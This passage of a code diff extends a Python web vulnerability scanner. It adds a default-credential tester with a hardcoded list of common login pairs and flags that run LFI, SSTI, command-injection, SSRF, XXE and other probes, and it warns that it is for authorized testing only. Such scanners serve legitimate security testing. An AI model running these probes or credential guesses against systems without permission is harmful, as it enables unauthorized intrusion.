+                        vuln_type="Stored XSS",
+                        severity="Critical", url=revisit,
+                        parameter=",".join(names[:3]),
+                        payload=self.STORED_PAYLOAD,
+                        evidence="payload persisted and rendered unescaped after submission",
+                        detail="Input is stored and rendered without encoding — "
+                               "every visitor executes the payload.",
+                        cvss_hint=8.6,
+                    ))
+                    return
+
+    # -- Default credentials (opt-in) ---------------------------------------
+    DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", "123456"),
+                     ("admin", "admin123"), ("test", "test"), ("guest", "guest"),
+                     ("user", "user"), ("administrator", "administrator")]
+
+    def scan_default_creds(self) -> None:
+        info("Default credential tests (login forms)")
+        for form in self.state.forms:
+            names = [i["name"] for i in form["inputs"] if i["name"]
+                     and i["type"] not in ("submit", "button", "image", "file", "reset")]
+            user_field = next((n for n in names if re.search(r"user|login|email", n, re.I)), None)
+            pass_field = next((n for n in names if re.search(r"pass|pwd", n, re.I)), None)
+            if not user_field or not pass_field:
+                continue
+            base = self.client.request(form["method"].upper(), form["url"],
+                                       data={n: "" for n in names}) \
+                   if form["method"] != "get" else None
+            for u, p in self.DEFAULT_CREDS:
+                data = {n: "x" for n in names}
+                data[user_field], data[pass_field] = u, p
+                if form["method"] == "get":
+                    resp = self.client.get(self._clean(form["url"]), params=data)
+                else:
+                    resp = self.client.request("POST", form["url"], data=data)
+                if resp is None:
+                    continue
+                body = resp.text.lower()
+                if any(k in body for k in ("logout", "log out", "sign out",
+                                           "welcome", "dashboard", "profile")) \
+                   and "invalid" not in body and "incorrect" not in body and \
+                   "wrong" not in body and "error" not in body[:500]:
+                    self.state.add(Finding(
+                        vuln_type="Default / Weak Credentials",
+                        severity="High", url=form["url"],
+                        parameter=f"{user_field}:{u} / {pass_field}:{p}",
+                        evidence="login appears to succeed with default credentials",
+                        detail="Default credentials accepted — verify manually and "
+                               "rotate immediately.",
+                        cvss_hint=7.5,
+                    ))
+                    break
+
+
+# ============================================================================
 # Reporting
 # ============================================================================
 def write_json_report(state: ScanState, path: str) -> None:
@@ -857,6 +1550,16 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--xss", action="store_true", help="XSS tests")
     p.add_argument("--dirs", action="store_true", help="Directory brute-force")
     p.add_argument("--audit", action="store_true", help="Misconfiguration audit")
+    p.add_argument("--advanced", action="store_true",
+                   help="Advanced modules: LFI, SSTI, CMDi, open redirect, CORS, "
+                        "CRLF, dir listing, JS libs, sensitive data")
+    p.add_argument("--lfi", action="store_true", help="LFI / path traversal only")
+    p.add_argument("--ssti", action="store_true", help="SSTI only")
+    p.add_argument("--cmdi", action="store_true", help="Command injection only")
+    p.add_argument("--no-param-fuzz", action="store_true",
+                   help="Skip hidden-parameter discovery")
+    p.add_argument("--default-creds", action="store_true",
+                   help="Try default credentials on login forms (authorized tests only)")
     p.add_argument("-w", "--wordlist", help="Wordlist file for directory busting")
     p.add_argument("-d", "--depth", type=int, default=3, help="Crawl depth [3]")
     p.add_argument("--max-urls", type=int, default=150, help="Max crawled URLs [150]")
@@ -864,6 +1567,8 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--delay", type=float, default=0.0, help="Delay between requests [0]")
     p.add_argument("--time-blind", type=float, default=5.0,
                    help="Seconds for time-based SQLi [5]")
+    p.add_argument("--no-time-blind", action="store_true",
+                   help="Skip time-based SQLi (much faster on slow/remote targets)")
     p.add_argument("--cookie", help='Cookies, e.g. "PHPSESSID=abc; role=user"')
     p.add_argument("--header", action="append", default=[],
                    help='Extra header "Name: Value" (repeatable)')
@@ -879,7 +1584,8 @@ def main() -> None:
     print(colorize(BANNER, "cyan"))
     warn("Authorized testing only — you are responsible for legal compliance.")
 
-    if not (args.full or args.crawl or args.sqli or args.xss or args.dirs or args.audit):
+    if not (args.full or args.crawl or args.sqli or args.xss or args.dirs
+            or args.audit or args.advanced or args.lfi or args.ssti or args.cmdi):
         args.full = True
 
     # Headers / cookies
@@ -928,14 +1634,40 @@ def main() -> None:
         state.crawled_urls.add(args.url)
 
     # Modules
+    if not args.no_param_fuzz:
+        ParamFuzzer(client, state).run()
     if args.full or args.audit:
         MisconfigAudit(client, state).run(args.url)
     if args.full or args.sqli:
-        SqliScanner(client, state, time_delay=args.time_blind).run()
+        SqliScanner(client, state,
+                    time_delay=None if args.no_time_blind else args.time_blind).run()
     if args.full or args.xss:
         XssScanner(client, state).run()
     if args.full or args.dirs:
         DirBuster(client, state, load_wordlist(args.wordlist)).run(args.url)
+    adv = AdvancedScanner(client, state)
+    if args.full or args.advanced or args.lfi:
+        adv.scan_lfi()
+    if args.full or args.advanced or args.ssti:
+        adv.scan_ssti()
+    if args.full or args.advanced or args.cmdi:
+        adv.scan_cmdi()
+    if args.full or args.advanced:
+        adv.scan_open_redirect()
+        adv.scan_cors()
+        adv.scan_crlf()
+        adv.scan_dir_listing()
+        adv.scan_js_libs()
+        adv.scan_sensitive()
+        adv.scan_known_vulns()
+        adv.scan_csrf()
+        adv.scan_xxe()
+        adv.scan_ssrf()
+        adv.scan_host_header()
+        adv.scan_jwt()
+        adv.scan_stored_xss()
+    if args.default_creds:
+        adv.scan_default_creds()
 
     # Summary
     print(colorize("\n────── Findings Summary ──────", "bold"))
